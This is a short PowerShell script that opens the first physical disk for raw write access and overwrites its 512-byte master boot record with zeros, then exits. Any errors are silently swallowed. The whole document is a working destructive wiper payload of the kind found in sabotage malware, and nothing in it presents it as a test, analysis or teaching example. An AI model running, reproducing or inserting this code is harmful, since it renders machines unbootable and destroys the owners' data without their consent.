$MBR_SIZE = 512

try {
    $MasterBootRecord = [System.IO.File]::Open("\\.\PhysicalDrive0", [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite)
    $MBRData = New-Object Byte[] $MBR_SIZE
    $MasterBootRecord.Write($MBRData, 0, $MBR_SIZE)
    Start-Sleep -Seconds 5
    $MasterBootRecord.Close()
    Exit 1
}
catch {
    # Exception handling code
    Exit 0
}
